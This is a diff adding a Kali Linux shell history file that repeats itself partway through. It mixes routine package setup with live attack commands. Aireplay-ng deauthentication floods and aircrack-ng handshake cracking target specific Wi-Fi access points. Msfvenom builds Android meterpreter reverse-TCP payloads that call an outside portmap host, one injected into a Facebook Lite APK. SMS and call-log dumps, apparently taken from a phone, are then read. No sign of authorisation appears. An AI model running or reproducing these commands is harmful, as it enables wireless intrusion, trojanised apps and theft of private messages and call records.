@@ -1,0 +1,1643 @@
+    1  leafpad /etc/resolv.conf
+    2  service network-manager restart 
+    3  dpkg -i virtualbox-6.0_6.0.8-130520~Ubuntu~bionic_amd64.deb 
+    4  apt -f
+    5  apt-get -f
+    6  apt --fix
+    7  apt --fix-missing
+    8  sudo apt-get update –fix-missing
+    9  sudo dpkg –configure -a
+   10  yes | apt-get install --fix-broken
+   11  apt install virtualbox
+   12  sudo apt update
+   13  apt list --upgradable
+   14  sudo apt upgrade 
+   15  sudo apt upgrade -y && poweroff 
+   16  dpkg -i virtualbox-6.0_6.0.8-130520~Ubuntu~bionic_amd64.deb 
+   17  yes | apt-get install --fix-broken
+   18  ping google.com
+   19  apt-get install gnome
+   20  poweroff
+   21  apt-get install gnome
+   22  y|  apt-get install gnome
+   23  y | apt-get install gnome
+   24  yes | apt-get install gnome
+   25  poweroff 
+   26  yes | apt-get install gnome
+   27  reboot 
+   28  apt-get install XFCE
+   29  git clone https://gitlab.com/kalilinux/packages/kali-undercover
+   30  sudo cp -r share /usr/
+   31  sudo cp bin/kali-undercover /usr/bin/
+   32  cp kali-undercover /usr/
+   33  cp -r share kali-undercover /usr/
+   34  cp -r kali-undercover /usr/
+   35  cd ~/kali-undercover/
+   36  sudo cp -r share /usr/
+   37  sudo cp bin/kali-undercover /usr/bin/
+   38  kali-undercover 
+   39  apt -y install kali-desktop-xfce 
+   40  pwd
+   41  ls
+   42  ls -la
+   43  ls -d
+   44  tree
+   45  kali-undercover 
+   46  kali-undercover
+   47  history 
+   48  history >> cmd.txt
+   49  winexe --ostype=1 --runas-file=tk17v10.0.57_setup_beta2.exe 
+   50  winexe --ostype=1 --interactive=1 --runas-file=tk17v10.0.57_setup_beta2.exe 
+   51  ls
+   52  ls /
+   53  cd /
+   54  thtk17v10.0.57_setup_beta2.exe
+   55  winexe tk17v10.0.57_setup_beta2.exe
+   56  apt -y install wine
+   57  wine
+   58  dpkg --add-architecture i386 && apt-get update && apt-get install wine32
+   59  wine tk17v10.0.57_setup_beta2.exe 
+   60  sudo apt install linux-headers-$(uname -r) dkms
+   61  sudo apt-get install virtualbox-6.0
+   62  sudo apt install linux-headers-$(uname -r) dkms
+   63  dpkg -i virtualbox-6.0_6.0.8-130520~Ubuntu~bionic_amd64.deb 
+   64  yes | apt-get install --fix-broken
+   65  ping google.com
+   66  dpkg -i virtualbox-6.0_6.0.8-130520~Ubuntu~bionic_amd64.deb 
+   67  yes | apt-get install --fix-broken
+   68  apt-get install vir.. 405613 files and directories currently installed.)
+   69  apt-get install virtulbox
+   70  sudo apt update
+   71  kali-undercover 
+   72  sudo apt update
+   73  vim /etc/resolv.conf 
+   74  sudo apt update
+   75  vim /etc/resolv.conf 
+   76  sudo apt update
+   77  nano /etc/apt/sources.list
+   78  vim /etc/apt/sources.list
+   79  sudo apt update
+   80  apt-get install youtube-dl 
+   81  vim /etc/apt/sources.list
+   82  apt-get install dkms build-essential 
+   83  wine
+   84  apt-get install wine32
+   85  wine32
+   86  apt-get install wine32
+   87  apt-get install wine64
+   88  apt-get install dkms build-essential 
+   89  dpkg --add-architecture i386 && apt-get update && apt-get install wine32
+   90  apt clean 
+   91  apt-get install dkms build-essential 
+   92  apt update
+   93  apt update && apt upgrade -y && apt dist-upgrade -y
+   94  apt update
+   95  apt update && apt upgrade -y && apt dist-upgrade -y
+   96  poweroff 
+   97  kali-undercover
+   98  apt update && apt upgrade -y && apt dist-upgrade -y
+   99  kali-undercover
+  100  ls
+  101  ls -l*.csa
+  102  ls -l.csa
+  103  aircrack-ng my-01.cap 
+  104  rm  
+  105  Opening my-01.capplease wait...
+  106  aireplay-ng -0 8 -a 56:DC:1D:9F:18:00 wlan0mon
+  107  aireplay-ng -0 1000 -a 56:DC:1D:9F:18:00 wlan0mon
+  108  aireplay-ng -0 10 -c EC:88:92:D4:BD:1C wlan0mon
+  109  aireplay-ng -0 1000 -a 56:DC:1D:9F:18:00 -c EC:88:92:D4:BD:1C wlan0mon
+  110  aireplay-ng -0 10 -c EC:88:92:D4:BD:1C wlan0mon
+  111  aireplay-ng -0 11 -a 56:DC:1D:9F:18:00 wlan0mon
+  112  aireplay-ng -0 5 -a 8C:44:35:0B:36:00 wlan0mon
+  113  airodump-ng --bssid 56:DC:1D:9F:18:00 -c 11 -w /root/Desktop/wifi/my wlan0mon
+  114  airodump-ng --bssid 8C:44:35:0B:36:00 -c 1 -w /root/Desktop/wifi/my wlan0mon
+  115  wine DirectX.exe 
+  116  aircrack-ng 
+  117  airodump-ng 
+  118  airmon-ng wlan0
+  119  airmon-ng start wlan0
+  120  airodump-ng wlan0mon
+  121  aireplay-ng -0 15 -c 8C:44:35:0B:36:00 wlan0mon
+  122  aireplay-ng -0 5 -a 8C:44:35:0B:36:00 wlan0mon
+  123  aireplay-ng -0 10 -a 8C:44:35:0B:36:00 wlan0mon
+  124  aireplay-ng -0 10 -a 8C:44:35:0B:36:00 -c 14:11:14:F5:F0:CB wlan0mon
+  125  aireplay-ng -0 15 -a 8C:44:35:0B:36:00 -c 14:11:14:F5:F0:CB wlan0mon
+  126  aireplay-ng -0 1 -a 8C:44:35:0B:36:00 wlan0mon
+  127  aireplay-ng -0 2 -a 8C:44:35:0B:36:00 wlan0mon
+  128  aireplay-ng -0 3 -a 8C:44:35:0B:36:00 wlan0mon
+  129  aireplay-ng -0 4 -a 8C:44:35:0B:36:00 wlan0mon
+  130  aireplay-ng -0 8 -a 8C:44:35:0B:36:00 wlan0mon
+  131  aireplay-ng -0 12 -a 8C:44:35:0B:36:00 wlan0mon
+  132  aireplay-ng -0 50 -a 8C:44:35:0B:36:00 wlan0mon
+  133  aireplay-ng -0 100 -a 8C:44:35:0B:36:00 wlan0mon
+  134  history >>cmd.txt
+  135  airodump-ng --bssid 8C:44:35:0B:36:00 -c 1 -w /root/Desktop/wifi/my 
+  136  airodump-ng --bssid 8C:44:35:0B:36:00 -c 1 -w /root/Desktop/wifi/my wlan0mon
+  137  aircrack-ng my-01.cap 
+  138  aircrack-ng my-01.cap -w /root/Desktop/words/my
+  139  aircrack-ng my-01.cap 
+  140  aircrack-ng my-02.cap 
+  141  aircrack-ng my-03.cap 
+  142  airodump-ng --bssid 8C:44:35:0B:36:00 -c 1 -w /root/Desktop/wifi/my wlan0mon
+  143  airmon start wlan0
+  144  airmon-ng start wlan0
+  145  airodump-ng --bssid 8C:44:35:0B:36:00 -c 1 -w /root/Desktop/wifi/my wlan0mon
+  146  aireplay-ng -0 50 -a 8C:44:35:0B:36:00 wlan0mon
+  147  poweroff 
+  148  kali-undercover
+  149  gcc
+  150  ls 
+  151  cd Desktop/
+  152  ls
+  153  leafpad
+  154  vim t1.cpp
+  155  gcc t1.cpp v.exe
+  156  gcc t1.cpp -o v.exe
+  157  vim t1.cpp
+  158  gcc t1.cpp -o v.exe
+  159  vim t1.cpp
+  160  gcc t1.cpp -o v.exe
+  161  vim t1.cpp
+  162  gcc t1.cpp -o v.exe
+  163  vim t1.cpp
+  164  gcc t1.cpp -o v.exe
+  165  vim t1.cpp
+  166  gcc t1.cpp -o v.exe
+  167  vim t1.cpp
+  168  gcc t1.cpp -o v.exe
+  169  vim t1.cpp
+  170  gcc t1.cpp -o v.exe
+  171  gcc t1.cpp
+  172  gcc t1.cpp -o /root/Desktop/v.cpp
+  173  gcc t1.cpp
+  174  gcc t1.cpp -o /root/Desktop/v.cpp
+  175  gcc t1.cpp -o /root/Desktop/v.exe
+  176  wine v.ex
+  177  wine v.exe
+  178  gcc t1.cpp -o /root/Desktop/v.exe
+  179  gcc t1.cpp
+  180  vim t1.cpp
+  181  gcc t1.cpp -o /root/Desktop/v.exe
+  182  gcc t1.cpp -w /root/Desktop/v.exe
+  183  gcc t1.cpp -o /root/Desktop/v.exe
+  184  gcc --help
+  185  gcc t1.cpp -v -o /root/Desktop/v.exe
+  186  gcc --help
+  187  Place the output into <file>.
+  188  gcc t1.cpp -x c++ -v -o /root/Desktop/v.exe
+  189  nano t2.c
+  190  gcc t2.c -o /root/Desktop/v.exe
+  191  gcc t2.c
+  192  wine v.exe 
+  193  kali-undercover
+  194  aireplay-ng -0 8 -a E0:DC:FF:81:B1:AA wlan0mon
+  195  airmon-ng start wlan0
+  196  ifconfig 
+  197  airodump-ng wlan0mon
+  198  pwd
+  199  cd Desktop/
+  200  ls
+  201  cd wifi
+  202  ls
+  203  airodump-ng --bssid E0:DC:FF:81:B1:AA -c -w /root/Desktop/my wlan0mon
+  204  airodump-ng --bssid E0:DC:FF:81:B1:AA -c 11 -w /root/Desktop/my wlan0mon
+  205  airodump-ng --bssid E0:DC:FF:81:B1:AA -c 11 -w /root/Desktop/wifi/my wlan0mon
+  206  ls
+  207  aircrack-ng my-01.cap 
+  208  kali-undercover
+  209  poweroff 
+  210  kali-undercover
+  211  poweroff 
+  212  kali-undercover
+  213  poweroff 
+  214  wine BANK.EXE 
+  215  poweroff 
+  216  gcc t1.cpp 
+  217  cat t1.cpp 
+  218  ls /usr/bin/ld
+  219  ls
+  220  ls /usr/bin/
+  221  kali-undercover 
+  222  ls
+  223  cd ..
+  224  reboot 
+  225  useradd v
+  226  passwd v
+  227  su - v
+  228  ls
+  229  chmod 770 /root
+  230  ls
+  231  su - v
+  232  startx
+  233  ls
+  234  service network-manager restart 
+  235  reboot 
+  236  echo hello
+  237  history >>cmd.txt
+  238  apt-get install wine32
+  239  wine
+  240  cd /root/Desktop/
+  241  ls
+  242  wine v.exe 
+  243  bash | tee /root/Desktop/del/t.txt
+  244  ls
+  245  pwd
+  246  shell >>/root/Desktop/del/t3.txt
+  247  cat /bin/sh >>/root/Desktop/del/t3.txt
+  248  /bin/sh >>/root/Desktop/del/t3.txt
+  249  log
+  250  cat log
+  251  cat ~log
+  252  cat ~/log
+  253  history >cmd.txt
+  254  bash | tee >/root/Desktop/del/t.txt
+  255  ls
+  256  ls -la
+  257  bash | tee >>/root/Desktop/del/t.txt
+  258  ls
+  259  bash >>/root/Desktop/del/t2.txt
+  260  kwrite sources.list
+  261  ls
+  262  echo okk >t3.txt 
+  263  ls
+  264  cat t3.txt 
+  265  cat t.txt 
+  266  2>&1 > t3.txt 
+  267  ls
+  268  echo vikas
+  269  utility 2>&1 >output.log 
+  270  exec 1> >(tee -a outfile)
+  271  ls
+  272  cat out
+  273  cat output.log 
+  274  rm output.log 
+  275  ls
+  276  cat outfile 
+  277  cat /sbin/shutdown
+  278  1;2cls
+  279  ls
+  280  apt-get update && apt-get upgrade 
+  281  history | grep "fix"
+  282  yes | apt-get install --fix-broken
+  283  history | grep ".lst"
+  284  apt-get update && apt-get upgrade -y
+  285  ~
+  286  apt-get update && apt-get upgrade -y
+  287  exit
+  288  exit
+  289  kwrite sources.list
+  290  ls
+  291  apt-get update && apt-get upgrade -y
+  292  yes | apt-get install --fix-broken
+  293  yes | apt-get install --f
+  294  yes | apt-get install -f
+  295  yes | apt-get install virvirtualbox-dkms
+  296  yes | apt-get install virvirtualbox
+  297  yes | apt-get install virtualbox
+  298  yes | apt-get install virtualbox-dkms 
+  299  yes | apt-get install virtualbox
+  300  yes | apt-get install virtualbox-dkms 
+  301  virtualbox 
+  302  kali-undercover
+  303  poweroff 
+  304  ./VMware-Workstation-Full-15.5.0-14665864.x86_64.bundle 
+  305  vmware
+  306  reboot 
+  307  ifconfig 
+  308  192.168.0.128
+  309  ping 192.168.0.128
+  310  leafpad
+  311  cat t1.cpp 
+  312  cat t2.cpp 
+  313  cat t2.cp
+  314  cat t2.c 
+  315  gcc t2.c 
+  316  a.out
+  317  vim t.cpp
+  318  cat t1.cpp > t3.cpp
+  319  cat t3.cpp 
+  320  vim t3.cpp 
+  321  gcc t3.cpp 
+  322  vim t3.cpp 
+  323  gcc t3.cpp 
+  324  vim t3.cpp 
+  325  gcc t3.cpp 
+  326  gedit 
+  327  poweroff 
+  328  kali-undercover
+  329  poweroff 
+  330  nmap -A 192.168.0.129 -p-
+  331  nikto -h 192.168.0.129
+  332  nikto -h 192.168.0.129 --system-dns
+  333  nikto -vhost+ 192.168.0.129 
+  334  apt install youtube-dl
+  335  youtube-dl https://youtu.be/uWlCSbnvkYw
+  336  display djinn\ -\ 1\ walkthrough\ _\ vulnhub-uWlCSbnvkYw.mkv 
+  337  play djinn\ -\ 1\ walkthrough\ _\ vulnhub-uWlCSbnvkYw.mkv 
+  338  p
+  339  pvdisplay '/media/root/vikas1/1_buckup now/youtube/djinn - 1 walkthrough _ vulnhub-uWlCSbnvkYw.mkv' 
+  340  echo vikas | base63
+  341  echo vikas | base64
+  342  echo vikas | md5
+  343  echo vikas | base32
+  344  nmap -A 192.168.0.129 -p-
+  345  ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ 
+  346  |     \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/
+  347  |     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
+  348  |     Let's see how good you are with simple maths
+  349  |     Answer my questions 1000 times and I'll give you your gift.
+  350  |     '*', 1)
+  351  |   RPCCheck: 
+  352  |     ____ _____ _ 
+  353  |     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ 
+  354  |     \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/
+  355  |     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
+  356  |     Let's see how good you are with simple maths
+  357  |     Answer my questions 1000 times and I'll give you your gift.
+  358  |_    '+', 9)
+  359  7331/tcp open     http    Werkzeug httpd 0.16.0 (Python 2.7.15+)
+  360  |_http-server-header: Werkzeug/0.16.0 Python/2.7.15+
+  361  |_http-title: Lost in space
+  362  1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+  363  SF-Port1337-TCP:V=7.80%I=7%D=12/22%Time=5DFF52E4%P=x86_64-pc-linux-gnu%r(N
+  364  SF:ULL,1BC,"\x20\x20____\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+  365  SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_____\x20_\x20\x20\x20\x2
+  366  SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20/\x20___\|\x20__
+  367  SF:\x20_\x20_\x20__\x20___\x20\x20\x20___\x20\x20\|_\x20\x20\x20_\(_\)_\x2
+  368  SF:0__\x20___\x20\x20\x20___\x20\n\|\x20\|\x20\x20_\x20/\x20_`\x20\|\x20'_
+  369  SF:\x20`\x20_\x20\\\x20/\x20_\x20\\\x20\x20\x20\|\x20\|\x20\|\x20\|\x20'_\
+  370  SF:x20`\x20_\x20\\\x20/\x20_\x20\\\n\|\x20\|_\|\x20\|\x20\(_\|\x20\|\x20\|
+  371  SF:\x20\|\x20\|\x20\|\x20\|\x20\x20__/\x20\x20\x20\|\x20\|\x20\|\x20\|\x20
+  372  SF:\|\x20\|\x20\|\x20\|\x20\|\x20\x20__/\n\x20\\____\|\\__,_\|_\|\x20\|_\|
+  373  SF:\x20\|_\|\\___\|\x20\x20\x20\|_\|\x20\|_\|_\|\x20\|_\|\x20\|_\|\\___\|\
+  374  SF:n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+  375  SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+  376  SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+  377  SF:\n\nLet's\x20see\x20how\x20good\x20you\x20are\x20with\x20simple\x20math
+  378  SF:s\nAnswer\x20my\x20questions\x201000\x20times\x20and\x20I'll\x20give\x2
+  379  SF:0you\x20your\x20gift\.\n\(6,\x20'\*',\x201\)\n>\x20")%r(RPCCheck,1BC,"\
+  380  SF:x20\x20____\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+  381  SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20_____\x20_\x20\x20\x20\x20\x20\x20\
+  382  SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20/\x20___\|\x20__\x20_\x20_
+  383  SF:\x20__\x20___\x20\x20\x20___\x20\x20\|_\x20\x20\x20_\(_\)_\x20__\x20___
+  384  SF:\x20\x20\x20___\x20\n\|\x20\|\x20\x20_\x20/\x20_`\x20\|\x20'_\x20`\x20_
+  385  SF:\x20\\\x20/\x20_\x20\\\x20\x20\x20\|\x20\|\x20\|\x20\|\x20'_\x20`\x20_\
+  386  SF:x20\\\x20/\x20_\x20\\\n\|\x20\|_\|\x20\|\x20\(_\|\x20\|\x20\|\x20\|\x20
+  387  SF:\|\x20\|\x20\|\x20\x20__/\x20\x20\x20\|\x20\|\x20\|\x20\|\x20\|\x20\|\x
+  388  SF:20\|\x20\|\x20\|\x20\x20__/\n\x20\\____\|\\__,_\|_\|\x20\|_\|\x20\|_\|\
+  389  SF:\___\|\x20\x20\x20\|_\|\x20\|_\|_\|\x20\|_\|\x20\|_\|\\___\|\n\x20\x20\
+  390  SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+  391  SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+  392  SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\nLet's\
+  393  SF:x20see\x20how\x20good\x20you\x20are\x20with\x20simple\x20maths\nAnswer\
+  394  SF:x20my\x20questions\x201000\x20times\x20and\x20I'll\x20give\x20you\x20yo
+  395  SF:ur\x20gift\.\n\(1,\x20'\+',\x209\)\n>\x20");
+  396  MAC Address: 08:00:27:31:31:DB (Oracle VirtualBox virtual NIC)
+  397  Device type: general purpose
+  398  Running: Linux 3.X|4.X
+  399  OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+  400  OS details: Linux 3.2 - 4.9
+  401  Network Distance: 1 hop
+  402  Service Info: OS: Unix
+  403  kwrite /etc/resolv.conf 
+  404  kwrite /etc/hosts
+  405  http://192.168.0.129/
+  406  kwrite /etc/hosts
+  407  echo _alid_=zraQfkPoYJjCI/lYmtTlsw==
+  408  echo _alid_=zraQfkPoYJjCI/lYmtTlsw== | ascii
+  409  poweroff 
+  410  apt update
+  411  apt upgrade -y
+  412  poweroff 
+  413  history >> cmd_3.txt 
+  414  apt upgrade -y
+  415  kwrite /etc/
+  416  ls /etc/apt/sources.list
+  417  kwrite /etc/apt/sources.list
+  418  apt upgrade -y
+  419  kwrite /etc/apt/sources.list
+  420  apt upgrade -y
+  421  kwrite /etc/apt/sources.list
+  422  apt upgrade -y
+  423  kwrite /etc/apt/sources.list
+  424  apt upgrade -y
+  425  poweroff 
+  426  ping google.com
+  427  ping google.com
+  428  apt upgrade -y
+  429  poweroff 
+  430  exit
+  431  ping google.com
+  432  exit
+  433  exit
+  434  poweroff 
+  435  ./v.exe 
+  436  history 
+  437  history >>cmd.txt
+  438  g
+  439  gcc help
+  440  gcc --help
+  441  gcc FACTORIA.CPP 
+  442  gcc FACTORIA.CPP a
+  443  gcc FACTORIA.CPP a.out
+  444  gcc FACTORIA.CPP -w a.out
+  445  gcc FACTORIA.CPP -w /root/
+  446  gcc FACTORIA.CPP -w /root/Desktop/install/program/a.out
+  447  gcc FACTORIA.CPP -w /root/Desktop/install/program/
+  448  gcc FACTORIA.CPP -w /root/Desktop/install/program/v.exe
+  449  gcc FACTORIA.CPP  /root/Desktop/install/program/v.exe
+  450  gcc FACTORIA.CPP -o /root/Desktop/install/program/v.exe
+  451  gcc FACTORIA.CPP -o /root/Desktop/v.exe
+  452  gcc FACTORIA.CPP -o /root/Desktop/install/program/v.exe
+  453  gcc FACTORIA.CPP -o test
+  454  ./test
+  455  sudo gcc –o first FACTORIA.CPP 
+  456  sudo gcc FACTORIA.CPP –o first 
+  457  sudo gcc FACTORIA.CPP
+  458  sudo gcc FACTORIA.CPP –O first 
+  459  sudo gcc FACTORIA.CPP -o first 
+  460  ls
+  461  msfconsole 
+  462  pwd
+  463  apt-get install openvpn
+  464  ifconfig
+  465  msfvenom -p android/meterpreter/reverse_tcp lhost=Vijay2045-32711.portmap.host lport=32711 -o test1.apk
+  466  ls
+  467  pwd
+  468  msfvenom -p android/meterpreter/reverse_tcp lhost=Vijay2045-32711.portmap.host lport=32711 -o test2.apk
+  469  ls
+  470  cd /
+  471  ls
+  472  cd usr/
+  473  ls
+  474  cd..
+  475  cd ..
+  476  ls
+  477  cd var
+  478  ls
+  479  losf
+  480  apt-get install lsof
+  481  lsof -t -i:1234
+  482  lsof -n | grep tcp  | grep LISTEN | grep 1234
+  483  lsof -n | grep TCP  | grep LISTEN | grep 1234
+  484  kali `lsof -t -i:1234
+  485  kali `lsof -t -i:1234`
+  486  kill `lsof -t -i:1234`
+  487  lsof -n | grep TCP  | grep LISTEN | grep 1234
+  488  kali `lsof -t -i:1234`
+  489  kill `lsof -t -i:1234`
+  490  lsof -t -i:1234
+  491  kill 3145
+  492  lsof -t -i:1234
+  493  opnvpn Vijay_2045.Hack.ovpn 
+  494  openvpn Vijay_2045.Hack.ovpn
+  495  l
+  496  ls
+  497  cd /
+  498  ls
+  499  cd root
+  500  ls
+  501  cat sms_dump_20191229201913.txt 
+  502  ls
+  503  cat calllog_dump_20191229202017.txt 
+  504  apktool
+  505  apt-get install apk-tool
+  506  apt-get install apktool
+  507  apktool
+  508  openvpn Vijay_2045.Hack.ovpn
+  509  ifconfig
+  510  msfvenom -p  android/meterpreter/reverse_tcp lhost = 192.168.43.164 lport = 4321
+  511  msfvenom -p  android/meterpreter/reverse_tcp lhost=192.168.43.164 lport=4321 -o lo_t1.apk
+  512  openvpn Vijay_2045.Hack.ovpn
+  513  ifconfig
+  514  msfvenom -x /root/Desktop/install/kill/Facebook\ Lite_v178.0.0.11.121_apkpure.com.apk -p android/meterpreter/reverse_tcp lhost=Vijay2045-32711.portmap.host lport=32711 -o M_facebook.apk
+  515  apktool Facebook\ Lite_v178.0.0.11.121_apkpure.com.apk 
+  516  apktool Facebook\ Lite_v178.0.0.11.121_apkpure.com.apk -f -o test
+  517  poweroff
+  518  keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
+  519  jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore (application_name).apk alias_name
+  520  jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore test.apk alias_name
+  521  apt-get install jarsigner
+  522  jarsigner
+  523  apt-get install java
+  524  apt-get install open-jdk
+  525  sudo apt-get install openjdk-11-jdk
+  526  sudo apt-get install openjdk-11-jdk -y
+  527  jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore test.apk alias_name
+  528  history >>cmd.txt
+    1  leafpad /etc/resolv.conf
+    2  service network-manager restart 
+    3  dpkg -i virtualbox-6.0_6.0.8-130520~Ubuntu~bionic_amd64.deb 
+    4  apt -f
+    5  apt-get -f
+    6  apt --fix
+    7  apt --fix-missing
+    8  sudo apt-get update –fix-missing
+    9  sudo dpkg –configure -a
+   10  yes | apt-get install --fix-broken
+   11  apt install virtualbox
+   12  sudo apt update
+   13  apt list --upgradable
+   14  sudo apt upgrade 
+   15  sudo apt upgrade -y && poweroff 
+   16  dpkg -i virtualbox-6.0_6.0.8-130520~Ubuntu~bionic_amd64.deb 
+   17  yes | apt-get install --fix-broken
+   18  ping google.com
+   19  apt-get install gnome
+   20  poweroff
+   21  apt-get install gnome
+   22  y|  apt-get install gnome
+   23  y | apt-get install gnome
+   24  yes | apt-get install gnome
+   25  poweroff 
+   26  yes | apt-get install gnome
+   27  reboot 
+   28  apt-get install XFCE
+   29  git clone https://gitlab.com/kalilinux/packages/kali-undercover
+   30  sudo cp -r share /usr/
+   31  sudo cp bin/kali-undercover /usr/bin/
+   32  cp kali-undercover /usr/
+   33  cp -r share kali-undercover /usr/
+   34  cp -r kali-undercover /usr/
+   35  cd ~/kali-undercover/
+   36  sudo cp -r share /usr/
+   37  sudo cp bin/kali-undercover /usr/bin/
+   38  kali-undercover 
+   39  apt -y install kali-desktop-xfce 
+   40  pwd
+   41  ls
+   42  ls -la
+   43  ls -d
+   44  tree
+   45  kali-undercover 
+   46  kali-undercover
+   47  history 
+   48  history >> cmd.txt
+   49  winexe --ostype=1 --runas-file=tk17v10.0.57_setup_beta2.exe 
+   50  winexe --ostype=1 --interactive=1 --runas-file=tk17v10.0.57_setup_beta2.exe 
+   51  ls
+   52  ls /
+   53  cd /
+   54  thtk17v10.0.57_setup_beta2.exe
+   55  winexe tk17v10.0.57_setup_beta2.exe
+   56  apt -y install wine
+   57  wine
+   58  dpkg --add-architecture i386 && apt-get update && apt-get install wine32
+   59  wine tk17v10.0.57_setup_beta2.exe 
+   60  sudo apt install linux-headers-$(uname -r) dkms
+   61  sudo apt-get install virtualbox-6.0
+   62  sudo apt install linux-headers-$(uname -r) dkms
+   63  dpkg -i virtualbox-6.0_6.0.8-130520~Ubuntu~bionic_amd64.deb 
+   64  yes | apt-get install --fix-broken
+   65  ping google.com
+   66  dpkg -i virtualbox-6.0_6.0.8-130520~Ubuntu~bionic_amd64.deb 
+   67  yes | apt-get install --fix-broken
+   68  apt-get install vir.. 405613 files and directories currently installed.)
+   69  apt-get install virtulbox
+   70  sudo apt update
+   71  kali-undercover 
+   72  sudo apt update
+   73  vim /etc/resolv.conf 
+   74  sudo apt update
+   75  vim /etc/resolv.conf 
+   76  sudo apt update
+   77  nano /etc/apt/sources.list
+   78  vim /etc/apt/sources.list
+   79  sudo apt update
+   80  apt-get install youtube-dl 
+   81  vim /etc/apt/sources.list
+   82  apt-get install dkms build-essential 
+   83  wine
+   84  apt-get install wine32
+   85  wine32
+   86  apt-get install wine32
+   87  apt-get install wine64
+   88  apt-get install dkms build-essential 
+   89  dpkg --add-architecture i386 && apt-get update && apt-get install wine32
+   90  apt clean 
+   91  apt-get install dkms build-essential 
+   92  apt update
+   93  apt update && apt upgrade -y && apt dist-upgrade -y
+   94  apt update
+   95  apt update && apt upgrade -y && apt dist-upgrade -y
+   96  poweroff 
+   97  kali-undercover
+   98  apt update && apt upgrade -y && apt dist-upgrade -y
+   99  kali-undercover
+  100  ls
+  101  ls -l*.csa
+  102  ls -l.csa
+  103  aircrack-ng my-01.cap 
+  104  rm  
+  105  Opening my-01.capplease wait...
+  106  aireplay-ng -0 8 -a 56:DC:1D:9F:18:00 wlan0mon
+  107  aireplay-ng -0 1000 -a 56:DC:1D:9F:18:00 wlan0mon
+  108  aireplay-ng -0 10 -c EC:88:92:D4:BD:1C wlan0mon
+  109  aireplay-ng -0 1000 -a 56:DC:1D:9F:18:00 -c EC:88:92:D4:BD:1C wlan0mon
+  110  aireplay-ng -0 10 -c EC:88:92:D4:BD:1C wlan0mon
+  111  aireplay-ng -0 11 -a 56:DC:1D:9F:18:00 wlan0mon
+  112  aireplay-ng -0 5 -a 8C:44:35:0B:36:00 wlan0mon
+  113  airodump-ng --bssid 56:DC:1D:9F:18:00 -c 11 -w /root/Desktop/wifi/my wlan0mon
+  114  airodump-ng --bssid 8C:44:35:0B:36:00 -c 1 -w /root/Desktop/wifi/my wlan0mon
+  115  wine DirectX.exe 
+  116  aircrack-ng 
+  117  airodump-ng 
+  118  airmon-ng wlan0
+  119  airmon-ng start wlan0
+  120  airodump-ng wlan0mon
+  121  aireplay-ng -0 15 -c 8C:44:35:0B:36:00 wlan0mon
+  122  aireplay-ng -0 5 -a 8C:44:35:0B:36:00 wlan0mon
+  123  aireplay-ng -0 10 -a 8C:44:35:0B:36:00 wlan0mon
+  124  aireplay-ng -0 10 -a 8C:44:35:0B:36:00 -c 14:11:14:F5:F0:CB wlan0mon
+  125  aireplay-ng -0 15 -a 8C:44:35:0B:36:00 -c 14:11:14:F5:F0:CB wlan0mon
+  126  aireplay-ng -0 1 -a 8C:44:35:0B:36:00 wlan0mon
+  127  aireplay-ng -0 2 -a 8C:44:35:0B:36:00 wlan0mon
+  128  aireplay-ng -0 3 -a 8C:44:35:0B:36:00 wlan0mon
+  129  aireplay-ng -0 4 -a 8C:44:35:0B:36:00 wlan0mon
+  130  aireplay-ng -0 8 -a 8C:44:35:0B:36:00 wlan0mon
+  131  aireplay-ng -0 12 -a 8C:44:35:0B:36:00 wlan0mon
+  132  aireplay-ng -0 50 -a 8C:44:35:0B:36:00 wlan0mon
+  133  aireplay-ng -0 100 -a 8C:44:35:0B:36:00 wlan0mon
+  134  history >>cmd.txt
+  135  airodump-ng --bssid 8C:44:35:0B:36:00 -c 1 -w /root/Desktop/wifi/my 
+  136  airodump-ng --bssid 8C:44:35:0B:36:00 -c 1 -w /root/Desktop/wifi/my wlan0mon
+  137  aircrack-ng my-01.cap 
+  138  aircrack-ng my-01.cap -w /root/Desktop/words/my
+  139  aircrack-ng my-01.cap 
+  140  aircrack-ng my-02.cap 
+  141  aircrack-ng my-03.cap 
+  142  airodump-ng --bssid 8C:44:35:0B:36:00 -c 1 -w /root/Desktop/wifi/my wlan0mon
+  143  airmon start wlan0
+  144  airmon-ng start wlan0
+  145  airodump-ng --bssid 8C:44:35:0B:36:00 -c 1 -w /root/Desktop/wifi/my wlan0mon
+  146  aireplay-ng -0 50 -a 8C:44:35:0B:36:00 wlan0mon
+  147  poweroff 
+  148  kali-undercover
+  149  gcc
+  150  ls 
+  151  cd Desktop/
+  152  ls
+  153  leafpad
+  154  vim t1.cpp
+  155  gcc t1.cpp v.exe
